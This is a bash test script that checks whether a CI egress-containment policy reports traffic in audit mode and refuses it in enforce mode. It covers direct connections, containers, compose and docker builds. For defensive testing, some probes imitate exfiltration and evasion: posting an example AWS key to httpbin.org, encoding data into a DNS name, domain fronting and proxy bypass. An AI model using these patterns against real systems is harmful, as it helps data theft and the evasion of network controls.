#!/usr/bin/env bash
# Containment probes: run inside a job, after the action, with .github/egress-selftest.yml. Every probe must pass in
# audit (the policy only reports) and be refused in enforce, except those marked "both" (allowed traffic, which
# must work in either mode). Exits 1 with the failing probes listed.
#   tests/probes.sh audit|enforce
set -uo pipefail
mode=${1:?audit or enforce}
fail=0
tmp=$(mktemp -d)
trap 'rm -rf "$tmp"' EXIT

# expect <allowed: both|outside> <name> <command…>: "both" must succeed always; "outside" must succeed in audit and
# fail in enforce.
expect() {
  local kind=$1 name=$2 got want
  shift 2
  if "$@" >"$tmp/out" 2>&1; then got=passed; else got=refused; fi
  case "$kind/$mode" in both/*) want=passed ;; outside/audit) want=passed ;; outside/enforce) want=refused ;; esac
  if [ "$got" = "$want" ]; then
    printf 'ok    %-62s %s\n' "$name" "$got"
  else
    printf 'FAIL  %-62s %s (want %s)\n' "$name" "$got" "$want"; sed 's/^/      /' "$tmp/out" | tail -5; fail=1
  fi
}
c() { curl -sS --max-time 15 -o /dev/null "$@"; }

ex_ip=$(getent ahostsv4 example.org | awk 'NR==1{print $1}')

# The job itself.
expect both    "allowed name through HTTPS_PROXY" c https://proxy.golang.org/
expect outside "name outside the policy through HTTPS_PROXY" c https://example.org/
expect outside "direct connection that ignores the proxy" c --noproxy '*' https://www.iana.org/
expect outside "Node fetch, which ignores HTTPS_PROXY" node -e 'fetch("https://example.org/").then(r=>process.exit(r.ok?0:1),()=>process.exit(1))'
expect outside "bare IP address, no name" c -k --noproxy '*' https://1.1.1.1/
[ "$mode" = enforce ] && expect outside "allowed SNI sent to another address (fronting)" c -k --noproxy '*' --resolve "proxy.golang.org:443:$ex_ip" https://proxy.golang.org/
expect both    "GitHub's storage account (Azure Blob in NO_PROXY)" c https://productionresultssa5.blob.core.windows.net/
expect outside "another Azure storage account (NO_PROXY: transparent proxy)" c https://azureopendatastorage.blob.core.windows.net/
expect outside "another Azure storage account through HTTPS_PROXY" c --proxy "$HTTPS_PROXY" https://azureopendatastorage.blob.core.windows.net/
expect outside "secret in a request to an inspected host (DLP)" curl -sSf --max-time 15 -o /dev/null -d "k=AKIAIOSFODNN7EXAMPLE" https://httpbin.org/post

# Data encoded into a DNS name: always resolved to NXDOMAIN here (no such name), flagged in the log either way.
getent hosts "aGVsbG8td29ybGQtdGhpcy1pcy1hLXNlY3JldC1wYXlsb2FkLXRlc3Q.example.org" >/dev/null 2>&1
if grep -q 'dns.high_entropy_label' "$EGRESS_CI_STATE/events.jsonl"; then
  printf 'ok    %-62s %s\n' "data encoded into a DNS name is flagged" flagged
else
  printf 'FAIL  %-62s %s\n' "data encoded into a DNS name is flagged" "not flagged"; fail=1
fi

# Containers and builds (the job's Docker socket).
docker pull -q alpine:3 >/dev/null
expect both    "container to an allowed name" docker run --rm alpine:3 wget -q -T 15 -O /dev/null https://proxy.golang.org/
expect outside "container to a name outside the policy" docker run --rm alpine:3 wget -q -T 10 -O /dev/null https://example.org/
expect outside "container to a bare IP address" docker run --rm alpine:3 wget -q -T 10 --no-check-certificate -O /dev/null https://1.1.1.1/
race() { # 10 containers that connect as soon as they start: none may get out before the lock knows them
  local leaks=0
  for _ in $(seq 1 10); do docker run --rm alpine:3 wget -q -T 5 -O /dev/null https://example.org/ >/dev/null 2>&1 && leaks=$((leaks + 1)); done
  echo "$leaks of 10 got out"; [ "$leaks" -gt 0 ]
}
expect outside "10 containers connecting at start" race
mkdir -p "$tmp/compose"
cat >"$tmp/compose/compose.yml" <<'EOF'
services:
  web:
    image: nginx:alpine
  client:
    image: alpine:3
    depends_on: [web]
    command: sh -c "sleep 2; wget -q -T 10 -O /dev/null http://web/ || exit 3; wget -q -T 10 -O /dev/null https://example.org/ || exit 4"
EOF
compose_rc() { (cd "$tmp/compose" && docker compose -p egressprobe up --abort-on-container-exit --exit-code-from client >/dev/null 2>&1; rc=$?; docker compose -p egressprobe down -v >/dev/null 2>&1; echo "client exit $rc"; [ $rc = "$1" ]); }
if [ "$mode" = enforce ]; then expect both "compose: service to service works, outside refused" compose_rc 4
else expect both "compose: service to service and outside work" compose_rc 0; fi
mkdir -p "$tmp/build"
printf 'FROM alpine:3\nRUN wget -q -T 15 -O /dev/null https://proxy.golang.org/\nRUN wget -q -T 10 -O /dev/null https://example.org/ && echo reached > /r || echo refused > /r\n' >"$tmp/build/Dockerfile"
build_reached() { docker build -q -t egressprobe "$tmp/build" >/dev/null && [ "$(docker run --rm egressprobe cat /r)" = reached ]; }
expect outside "docker build RUN step to a name outside the policy" build_reached
expect outside "image pull from a registry outside the policy" docker pull -q quay.io/prometheus/busybox:latest

exit $fail
